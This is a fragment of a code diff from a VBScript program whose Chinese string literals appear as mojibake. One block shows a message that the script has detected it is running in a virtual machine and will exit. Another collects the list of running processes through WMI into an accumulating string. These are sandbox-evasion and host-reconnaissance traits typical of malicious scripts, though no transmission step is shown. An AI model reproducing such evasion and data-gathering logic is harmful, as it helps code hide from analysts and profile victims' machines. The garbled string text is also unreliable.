+MsgBox "å’¦ï¼Œï¼ˆç¯é¡¾å››å‘¨ï¼‰æˆ‘æ€ä¹ˆè¢«å›°åœ¨è™šæ‹Ÿæœºé‡Œäº†ï¼Ÿï¼ˆæŒ‡ç€è™šæ‹Ÿçš„ç¯å¢ƒï¼‰è¿™è¿˜æ€ä¹ˆæ“ä½œï¼Ÿç©ä¸ª" & Seewhat & "?ï¼ˆç¨‹åºå°†é€€å‡ºï¼‰", vbCritical, "ç©ä¸ªé”¤å­"
 End
 End If
 s = s & zmwj
@@ -423,7 +413,7 @@ s = s & zmwj
 Dim objs, obj
     Set WMI = GetObject("WinMgmts:")
     Set objs = WMI.InstancesOf("Win32_Process")
-    s = s & "»îÔ¾½ø³Ì£º" & vbCrLf
+    s = s & "æ´»è·ƒè¿›ç¨‹ï¼š" & vbCrLf
     For Each obj In objs
         s = s & obj.Description & Chr(13) & Chr(10)
     Next
